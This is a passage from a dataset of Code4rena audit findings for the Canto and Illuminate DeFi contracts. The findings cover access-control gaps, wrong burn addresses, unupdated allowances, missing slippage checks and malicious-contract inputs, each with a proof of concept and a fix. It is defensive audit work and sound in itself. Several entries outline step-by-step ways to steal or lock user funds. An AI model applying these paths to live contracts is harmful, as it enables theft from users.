contract A{     uint public destination;     uint256 public number;     function convertA() external{         (bool su,bytes memory ret )= address(this).call(abi.encodeWithSelector(this.ret.selector));         number = ret.length;         destination = abi.decode(ret, (uint));     }     function ret() public returns(bytes memory){         return \"1234\";     } } ``` ## Tools Used None ## Recommended Mitigation Steps Requires data.length == 32  "}, {"title": "baseRatePerBlock is set in constructor but not anywhere else", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/NoteInterest.sol#L73-L77   # Vulnerability details  ## Impact baseRatePerBlock cannot be relied on to accurately contain current interest rate  ## Proof of Concept baseRatePerBlock is set in the constructor but then not update in either updateBaseRate or _setBaseRatePerYear which update baseRatePerYear. Any contract that pulls the interest rate from baseRatePerBlock will always get the interest rate initially set at the creation of the contract  ## Tools Used  ## Recommended Mitigation Steps Update baseRatePerBlock in updateBaseRate and _setBaseRatePerYear  "}, {"title": "Accountant can't be initialized", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/53", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Accountant/AccountantDelegate.sol#L29   # Vulnerability details  ## Impact It's not possible to initialize the accountant because of a mistake in the function's require statement.  I rate it as MED since a key part of the protocol wouldn't be available until the contract is modified and redeployed.  ## Proof of Concept The issue is the following `require()` statement: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Accountant/AccountantDelegate.sol#L29  There, the function checks whether the accountant has received the correct amount of tokens. But, it compares the accountant's balance with the `_initialSupply`. That value is always 0. So the require statement will always fail  When the Note contract is initialized, `_initialSupply` is set to 0:  - https://github.com/Plex-Engineer/lending-market/blob/main/deploy/canto/004_deploy_Note.ts#L14 - https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Note.sol#L9 - https://github.com/Plex-Engineer/lending-market/blob/main/contracts/ERC20.sol#L32  After `_mint_to_Accountant()` mints `type(uint).max` tokens to the accountant: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Note.sol#L18 That increases the `totalSupply` but not the `_initialSupply`: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/ERC20.sol#L242  The `_initialSupply` value is only modified by the ERC20 contract's constructor.  ## Tools Used none  ## Recommended Mitigation Steps Change the require statement to ```sol require(note.balanceOf(msg.sender) == note.totalSupply(), \"AccountantDelegate::initiatlize: Accountant has not received payment\"); ```  "}, {"title": "Comptroller uses the wrong address for the WETH contract", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/46", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1469   # Vulnerability details  ## Impact The Comptroller contract uses a hardcoded address for the WETH contract which is not the correct one. Because of that, it will be impossible to claim COMP rewards. That results in a loss of funds so I rate it as HIGH.  ## Proof of Concept The Comptroller's `getWETHAddress()` function: https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1469  It's a left-over from the original compound repo: https://github.com/compound-finance/compound-protocol/blob/master/contracts/Comptroller.sol#L1469  It's used by the `grantCompInternal()` function: https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1377  That function is called by `claimComp()`: https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/Comptroller.sol#L1365   If there is a contract stored in that address and it doesn't adhere to the interface (doesn't have a `balanceOf()` and `transfer()` function), the transaction will revert. If there is no contract, the call will succeed without having any effect. In both cases, the user doesn't get their COMP rewards.  ## Tools Used none  ## Recommended Mitigation Steps The WETH contract's address should be parsed to the Comptroller through the constructor or another function instead of being hardcoded.  "}, {"title": "It's not possible to execute governance proposals through the GovernorBravoDelegate contract", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/39", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Governance/GovernorBravoDelegate.sol#L63 https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Governance/GovernorBravoDelegate.sol#L87   # Vulnerability details  ## Impact It's not possible to execute a proposal through the GovernorBravoDelegate contract because the `executed` property of it is set to `true` when it's queued up.  Since this means that the governance contract is unusable, it might result in locked-up funds if those were transferred to the contract before the issue comes up. Because of that I'd rate it as HIGH.  ## Proof of Concept `executed` is set to `true`: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Governance/GovernorBravoDelegate.sol#L63  Here, the `execute()` function checks whether the proposal's state is `Queued`: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Governance/GovernorBravoDelegate.sol#L87 But, since the `execute` property is `true`, the `state()` function will return `Executed`: https://github.com/Plex-Engineer/lending-market/blob/main/contracts/Governance/GovernorBravoDelegate.sol#L117  In the original compound repo, `executed` is `false` when the proposal is queued up: https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/GovernorBravoDelegate.sol#L111  ## Tools Used none  ## Recommended Mitigation Steps Just delete the line where `executed` is set to `true`. Since the zero-value is `false` anyway, you'll save gas as well.  "}, {"title": "Anyone can create Proposal Unigov Proposal-Store.sol", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/26", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/manifest/blob/688e9b4e7835854c22ef44b045d6d226b784b4b8/contracts/Proposal-Store.sol#L46 https://github.com/Plex-Engineer/lending-market/blob/b93e2867a64b420ce6ce317f01c7834a7b6b17ca/contracts/Governance/GovernorBravoDelegate.sol#L37   # Vulnerability details  ## Impact Proposal Store is used to store proposals that have already passed (https://code4rena.com/contests/2022-06-new-blockchain-contest#unigov-module-615-sloc) \" Upon a proposal\u2019s passing, the proposalHandler either deploys the ProposalStore contract (if it is not already deployed) or appends the proposal into the ProposalStore\u2019s mapping ( uint \u21d2 Proposal)\"  But anyone can add proposals to the contract directly via AddProposal() function.  Unigov proposals can be queued and executed by anyone in GovernorBravoDelegate contract https://github.com/Plex-Engineer/lending-market/blob/b93e2867a64b420ce6ce317f01c7834a7b6b17ca/contracts/Governance/GovernorBravoDelegate.sol#L37  ## Proof of Concept https://github.com/Plex-Engineer/manifest/blob/688e9b4e7835854c22ef44b045d6d226b784b4b8/contracts/Proposal-Store.sol#L46  ## Recommended Mitigation Steps Authorization checks for AddProposal, only governance module should be able to update  "}, {"title": "Anyone can set the `baseRatePerYear` after the `updateFrequency` has passed", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/22", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/NoteInterest.sol#L118-L129   # Vulnerability details  ## Impact The `updateBaseRate()` function is public and lacks access control, so anyone can set the critical variable `baseRatePerYear` once the block delta has surpassed the `updateFrequency` variable. This will have negative effects on the borrow and supply rates used anywhere else in the protocol.  The updateFrequency is explained to default to 24 hours per the comments, so this vulnerability will be available every day. Important to note, the admin can fix the `baseRatePerYear` by calling the admin-only `_setBaseRatePerYear()` function. However, calling this function does not set the `lastUpdateBlock` so users will still be able to change the rate back after the 24 hours waiting period from the previous change.   ## Proof of Concept ```     function updateBaseRate(uint newBaseRatePerYear) public {         // check the current block number         uint blockNumber = block.number;         uint deltaBlocks = blockNumber.sub(lastUpdateBlock);           if (deltaBlocks > updateFrequency) {             // pass in a base rate per year             baseRatePerYear = newBaseRatePerYear;             lastUpdateBlock = blockNumber;             emit NewInterestParams(baseRatePerYear);         }     } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps I have trouble understanding the intention of this function. It appears that the rate should only be able to be set by the admin, so the `_setBaseRatePerYear()` function seems sufficient. Otherwise, add access control for only trusted parties.  "}, {"title": "Stealing Wrapped Manifest in WETH.sol", "html_url": "https://github.com/code-423n4/2022-06-canto-findings/issues/19", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-canto-findings", "body": "# Lines of code  https://github.com/Plex-Engineer/lending-market/blob/755424c1f9ab3f9f0408443e6606f94e4f08a990/contracts/WETH.sol#L85   # Vulnerability details  ## Impact Allows anyone to steal all wrapped manifest from the WETH.sol contract. Attacker can also withdraw to convert Wrapped Manifest to Manifest.  Issue in approve(address owner, address spender) external function. This allows an attacker to approve themselves to spend another user's tokens.  Attacker can then use transferFrom(address src, address dst, uint wad) function to send tokens to themself.  ## Proof of Concept Hardhat + Chai test to show exploit. Test file is test/POC.js https://github.com/soosh1337/POC_lending_market_WETH   ## Tools Used VScode, hardhat  ## Recommended Mitigation Steps I believe there is no need for this function. There is another approve(address guy, uint wad) function that uses msg.sender to approve allowance. There should be no need for someone to approve another user's allowance.  Remove the approve(address owner, address spender) function.  "}, {"title": "[H-05] Not minting iPTs for lenders in several lend functions", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/391", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L247-L305 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L317-L367 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L192-L235   # Vulnerability details  ## Impact Using any of the `lend` function mentioned, will result in loss of funds to the lender - as the funds are transferred from them but no iPTs are sent back to them! Basically making lending via these external PTs unusable.   ## Proof of Concept There is no minting of iPTs to the lender (or at all) in the 2 `lend` functions below: https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L247-L305 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L317-L367  Corresponding to lending of (respectively): swivel element  Furthermore, in: https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L227-L234 Comment says \"Purchase illuminate PTs directly to msg.sender\", but this is not happening. sending yield PTs at best.  ## Recommended Mitigation Steps Mint the appropriate amount of iPTs to the lender - like in the rest of the lend functions.  "}, {"title": "Sandwich attacks are possible as there is no slippage control option in Marketplace and in Lender yield swaps", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/389", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/MarketPlace.sol#L131-L189 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L634-L657   # Vulnerability details  Swapping function in Marketplace and Lender's yield() can be sandwiched as there is no slippage control option. Trades can happen at a manipulated price and end up receiving fewer tokens than current market price dictates.  Placing severity to be medium as those are system core operations, while funds there can be substantial, so sandwich attacks are often enough economically viable and thus probable, while they result in a partial fund loss.  ## Proof of Concept  All four swapping functions of Marketplace do not allow for slippage control:  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/MarketPlace.sol#L131-L189  ```solidity     /// @notice sells the PT for the PT via the pool     /// @param u address of the underlying asset     /// @param m maturity (timestamp) of the market     /// @param a amount of PT to swap     /// @return uint128 amount of PT bought     function sellPrincipalToken(         address u,         uint256 m,         uint128 a     ) external returns (uint128) {         IPool pool = IPool(pools[u][m]);         Safe.transfer(IERC20(address(pool.fyToken())), address(pool), a);         return pool.sellFYToken(msg.sender, pool.sellFYTokenPreview(a));     }      /// @notice buys the underlying for the PT via the pool     /// @param u address of the underlying asset     /// @param m maturity (timestamp) of the market     /// @param a amount of underlying tokens to sell     /// @return uint128 amount of PT received     function buyPrincipalToken(         address u,         uint256 m,         uint128 a     ) external returns (uint128) {         IPool pool = IPool(pools[u][m]);         Safe.transfer(IERC20(address(pool.base())), address(pool), a);         return pool.buyFYToken(msg.sender, pool.buyFYTokenPreview(a), a);     }      /// @notice sells the underlying for the PT via the pool     /// @param u address of the underlying asset     /// @param m maturity (timestamp) of the market     /// @param a amount of underlying to swap     /// @return uint128 amount of underlying sold     function sellUnderlying(         address u,         uint256 m,         uint128 a     ) external returns (uint128) {         IPool pool = IPool(pools[u][m]);         Safe.transfer(IERC20(address(pool.base())), address(pool), a);         return pool.sellBase(msg.sender, pool.sellBasePreview(a));     }      /// @notice buys the underlying for the PT via the pool     /// @param u address of the underlying asset     /// @param m maturity (timestamp) of the market     /// @param a amount of PT to swap     /// @return uint128 amount of underlying bought     function buyUnderlying(         address u,         uint256 m,         uint128 a     ) external returns (uint128) {         IPool pool = IPool(pools[u][m]);         Safe.transfer(IERC20(address(pool.fyToken())), address(pool), a);         return pool.buyBase(msg.sender, pool.buyBasePreview(a), a);     } ```  Similarly, Lender's yield does the swapping without the ability to control the slippage:  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L634-L657  ```solidity     /// @notice transfers excess funds to yield pool after principal tokens have been lent out     /// @dev this method is only used by the yield, illuminate and swivel protocols     /// @param u address of an underlying asset     /// @param y the yield pool to lend to     /// @param a the amount of underlying tokens to lend     /// @param r the receiving address for PTs     /// @return uint256 the amount of tokens sent to the yield pool     function yield(         address u,         address y,         uint256 a,         address r     ) internal returns (uint256) {         // preview exact swap slippage on yield         uint128 returned = IYield(y).sellBasePreview(Cast.u128(a));          // send the remaing amount to the given yield pool         Safe.transfer(IERC20(u), y, a);          // lend out the remaining tokens in the yield pool         IYield(y).sellBase(r, returned);          return returned;     } ```  ## Recommended Mitigation Steps  Consider adding minimum accepted return argument to the five mentioned functions and condition execution success on it so the caller can control for the realized slippage and sustain the sandwich attacks to an extent.  "}, {"title": "Illuminate PT redeeming allows for burning from other accounts", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/387", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L114-L128   # Vulnerability details  Illuminate PT burns shares from a user supplied address account instead of user's account. With such a discrepancy a malicious user can burn all other's user shares by having the necessary shares on her balance, while burning them from everyone else.  Setting the severity to be high as this allows for system-wide stealing of user's funds.  ## Proof of Concept  Redeemer's Illuminate redeem() checks the balance of msg.sender, but burns from the balance of user supplied `o` address:  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L114-L128  L120:  ```solidity uint256 amount = token.balanceOf(msg.sender); ```  L126:  ```solidity token.burn(o, amount); ```  ```solidity         address principal = IMarketPlace(marketPlace).markets(u, m, p);          if (p == uint8(MarketPlace.Principals.Illuminate)) {             // Get Illuminate's principal token             IERC5095 token = IERC5095(principal);             // Get the amount of tokens to be redeemed from the sender             uint256 amount = token.balanceOf(msg.sender);             // Make sure the market has matured             if (block.timestamp < token.maturity()) {                 revert Invalid('not matured');             }             // Burn the prinicipal token from Illuminate             token.burn(o, amount);             // Transfer the original underlying token back to the user             Safe.transferFrom(IERC20(u), lender, address(this), amount); ```  `o` address isn't validated and used as provided.  Burning proceeds as usual, Illuminate PT burns second argument `a` from the first argument `f`, i.e. `f`'s balance to be reduced by `a`:  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/ERC5095.sol#L121-L127  ```solidity     /// @param f Address to burn from     /// @param a Amount to burn     /// @return bool true if successful     function burn(address f, uint256 a) external onlyAdmin(redeemer) returns (bool) {         _burn(f, a);         return true;     } ```  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/ERC5095.sol#L7  ```solidity contract ERC5095 is ERC20Permit, IERC5095 { ```  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/ERC20.sol#L187-L196  ```solidity     function _burn(address src, uint wad) internal virtual returns (bool) {         unchecked {             require(_balanceOf[src] >= wad, \"ERC20: Insufficient balance\");             _balanceOf[src] = _balanceOf[src] - wad;             _totalSupply = _totalSupply - wad;             emit Transfer(src, address(0), wad);         }          return true;     } ```  This way a malicious user owning some Illuminate PT can burn the same amount of PT as she owns from any another account, that is essentially from all other accounts, obtaining all the underlying tokens from the system. The behavior is somewhat similar to the public burn case.  ## Recommended Mitigation Steps  `o` address looks to be not needed in Illuminate PT case.  Consider burning the shares from `msg.sender`, for example:  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L125-L126  ```solidity             // Burn the prinicipal token from Illuminate -           token.burn(o, amount); +           token.burn(msg.sender, amount); ```  "}, {"title": "Funds may be stuck when `redeeming` for Illuminate", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/384", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L120   # Vulnerability details  ## Impact Funds may be stuck when `redeeming` for Illuminate.  ## Proof of Concept Assuming the goal of calling `redeem` for Illuminate [here](https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L116) is to redeem the Illuminate principal held by the lender or the redeemer, then there is an issue because the wrong [balance](https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L120) is checked. So if no `msg.sender` has a positive balance funds will be lost.   Now assuming the goal of calling `redeem` for Illuminate [here](https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L116) is for users to redeem their Illuminate principal and receive the underlying as suggested by this [comment](https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L127), then the underlying is not sent back to users because `Safe.transferFrom(IERC20(u), lender, address(this), amount);` send the funds to the redeemer, not the user.    ## Recommended Mitigation Steps Clarify the purpose of this function and fix the corresponding bug.  "}, {"title": "Able to mint any amount of PT", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/349", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  [Lender.sol#L192-L235](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L192-L235) [Lender.sol#L486-L534](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L486-L534) [Lender.sol#L545-L589](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L545-L589)   # Vulnerability details  ## Impact  Some of the ```lend``` functions do not validate addresses sent as input which could lead to a malicous user being able to mint more PT tokens than they should.  Functions affect:  - [Illuminate and Yield ```lend``` function](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L192-L235).  - [Sense ```lend``` function](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L486-L534).  - [APWine ```lend``` function](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L545-L589).  ## Proof of Concept  In the Illuminate and Yield ```lend``` function:  1. Let the Yieldspace pool ```y``` be a malicious contract that implements the ```IYield``` interface.  2. The ```base``` and ```maturity``` functions for ```y``` may return any value so the conditions on lines 208 and 210 are easily passed.  3. The caller of ```lend``` sends any amount ```a``` for the desired underlying ```u```.  4. If principal token ```p``` corresponds to the Yield principal, then the ```yield``` function is called which has a [return value controlled by the malicious contract ```y```](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L648).  5. The ```mint``` function is then called for the principal token with an underlying ```u``` and a maturity ```m``` which will then mint the ```returned``` amount of principal tokens to the malicious user.    In the Sense ```lend``` function:  1. Let the amm ```x``` input variable be a malicous contract that implements the ```ISense``` interface.  2. The malicious user sends any amount of underlying to ```Lender.sol```.  3. Since the amm isn't validated, the ```swapUnderlyingForPTs``` function can return any amount for ```returned``` that is used to mint the Illuminate tokens.  4. The malicious user gains a disproportionate amount of PT.    In the APWine ```lend``` function:  1. Let the APWine ```pool``` input variable be a malicous contract that implements the ```IAPWineRouter``` interface.  2. The malicious user sends any amount of underlying to ```Lender.sol```.  3. The ```swapExactAmountIn``` function of the malicious ```pool``` contract returns any amount for ```returned```.  4. The ```mint``` function is called for the PT with underlying ```u``` and maturity ```m``` with the attacker controlled ```returned``` amount.  ## Recommmended Mitigation Steps  Consider validating the input addresses of [```y```](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L197), [```x```](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L492) and [```pool```](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L551) through a whitelisting procedure if possible or validating that the ```returned``` amounts correspond with the amount of PT gained from the protocols by checking the balance before and after the PTs are gained and checking the difference is equal to ```returned```.  "}, {"title": "[M-01] Easily bypassing admins 'pause' for swivel", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/343", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L247-L305   # Vulnerability details  ## Impact Assuming admin decides to pause an external principle when it's dangerous, malicious or unprofitable, Bypassing the admins decision can result in loss of funds for the project.  ## Proof of Concept https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L247-L305  * The principals enum `p` is only used for `unpaused(p)` modifier, and to emit an event. * Attacker can bypass the `unpaused(p)` modifier check by simply passing an enum of another principle that is not paused. * The function will just continue as normal, without any other side-effect, as if the `pause` is simple ignored.  ## Recommended Mitigation Steps Add this check at the beginning of the function (just like in similar functions of this solution) `        if (p != uint8(MarketPlace.Principals.Swivel)) {             revert Invalid('principal');         } `  "}, {"title": "Unable to redeem from Notional", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/341", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  [Redeemer.sol#L193](https://github.com/code-423n4/2022-06-illuminate/blob/main/redeemer/Redeemer.sol#L193)   # Vulnerability details  ## Impact  The ```maxRedeem``` function is a view function which only returns the balance of the ```Redeemer.sol``` contract. After this value is obtained, the PT is not redeemed from Notional. The user will be unable to redeem PT from Notional through ```Redeemer.sol```.  ## Proof of Concept  Notional code: ```     function maxRedeem(address owner) public view override returns (uint256) {         return balanceOf(owner);     } ```  ## Recommmended Mitigation Steps  Call [```redeem```](https://github.com/notional-finance/wrapped-fcash/blob/019cfa20369d5e0d9e7a38fea936cc649704780d/contracts/wfCashERC4626.sol#L205) from Notional using the ```amount``` from ```maxRedeem``` as the ```shares``` input after the call to ```maxRedeem```.  "}, {"title": "Leak of Value in `yield` function, slippage check is not effective", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/289", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L641-L654   # Vulnerability details  The function `yield` is using the input from `sellBasePreview` and then using it.  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L641-L654  ```solidity     function yield(         address u,         address y,         uint256 a,         address r     ) internal returns (uint256) {         // preview exact swap slippage on yield         uint128 returned = IYield(y).sellBasePreview(Cast.u128(a));          // send the remaing amount to the given yield pool         Safe.transfer(IERC20(u), y, a);          // lend out the remaining tokens in the yield pool         IYield(y).sellBase(r, returned); ```  The output of `sellBasePreview` is meant to be used off-chain to avoid front-running and price changes, additionally no validation is performed on this value (is it zero, is it less than 95% of amount) meaning the check is equivalent to setting `returned = 0`  I'd recommend to add checks, or ideally have a trusted keeper bulk `sellBase` with an additional slippage check as the function parameter  "}, {"title": "Incorrect implementation of APWine and Tempus `redeem`", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/268", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Redeemer.sol#L136   # Vulnerability details  Redeeming APWine and Tempus PT will always fail, causing a portion of iPT to not be able to be redeemed for the underlying token.  The issue is caused by the incorrect implementation of `redeem`: ``` uint256 amount = IERC20(principal).balanceOf(lender); Safe.transferFrom(IERC20(u), lender, address(this), amount); ``` The first line correctly calculates the balance of PT token available in `Lender`. However, the second line tries to transfer the underlying token `u` instead of `principal` from Lender to `Redeemer`. Therefore, the redeeming process will always fail as both `APWine.withdraw` and `ITempus.redeemToBacking` will try to redeem non-existent PT.  ## Recommended Mitigation Steps Fix the transfer line: ``` Safe.transferFrom(IERC20(principal), lender, address(this), amount); ```  "}, {"title": "Lender: no check for paused market on mint", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/260", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L172   # Vulnerability details  Lender's `mint` function [does not check](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L172) whether the supplied market is paused.  ## Impact Even if a market is paused due to insolvency/bugs, an attacker can issue iPTs. This renders the whole pause and insolvency protection mechanism ineffective. See POC.  ## Proof of Concept Let's say market P has become insolvent, and Illuminate pauses that market, as it doesn't want to create further bad debt. Let's say P's principal tokens's value has declined severely in the market because of the insolvency. An attacker can buy many worthless P principal tokens for cheap, then call Lender and mint from them iPT. The attacker is now owed underlying which belongs to the legitimate users. There won't be enough funds to repay everybody.  ## Recommended Mitigation Steps Check in `mint` that the market is not paused.  "}, {"title": "ERC5095 redeem/withdraw does not update allowances", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/245", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/main/marketplace/ERC5095.sol#L100   # Vulnerability details  ERC5095's `redeem`/`withdraw` allows an ERC20-approved account to redeem user's tokens, but does not update the allowance after burning.  ## Impact User Mal can burn more tokens than Alice allowed him to. He can set himself to be the receiver of the underlying, therefore Alice will lose funds.  ## Proof of Concept [`withdraw`](https://github.com/code-423n4/2022-06-illuminate/blob/main/marketplace/ERC5095.sol#L100) and [`redeem`](https://github.com/code-423n4/2022-06-illuminate/blob/main/marketplace/ERC5095.sol#L116) functions check that the msg.sender has enough approvals to redeem the tokens: ```             require(_allowance[holder][msg.sender] >= underlyingAmount, 'not enough approvals'); ``` But they do not update the allowances. They then call `authRedeem`, which also does not update the allowances. Therefore, an approved user could \"re-use his approval\" again and again and redeem whole of approver's funds to himself.  ## Recommended Mitigation Steps Update the allowances upon spending.  "}, {"title": "Redeem Sense can be bricked", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/244", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/main/redeemer/Redeemer.sol#L262   # Vulnerability details  Sense's `redeem` can be totally DOSd due to user supplied input.  ## Impact Using this attack, Sense market can not be redeemed.  ## Proof of Concept [This](https://github.com/code-423n4/2022-06-illuminate/blob/main/redeemer/Redeemer.sol#L253:#L262) is how Sense market is being redeemed: ```         IERC20 token = IERC20(IMarketPlace(marketPlace).markets(u, m, p));         uint256 amount = token.balanceOf(lender);         Safe.transferFrom(token, lender, address(this), amount);         ISense(d).redeem(o, m, amount); ``` The problem is that `d` is user supplied input and the function only tries to redeem the amount that was transferred from Lender.  A user can supply malicious `d` contract which does nothing on `redeem(o, m, amount)`. The user will then call Redeemer's `redeem` with his malicious contract. Redeemer will transfer all the prinicipal from Lender to itself, will call `d` (noop), and finish. Sense market has not been redeemed.  Now if somebody tries to call Sense market's `redeem` again, the `amount` variable will be 0, and Redeemer will try to redeem 0 from Sense.  All the original principal is locked and lost in the contract, like tears in rain.  ## Recommended Mitigation Steps I think you should either use a whitelisted Sense address, or send to `ISense(d).redeem` Redeemer's whole principal balance.  "}, {"title": "Tempus lend method wrongly calculates amount of iPT tokens to mint", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/222", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  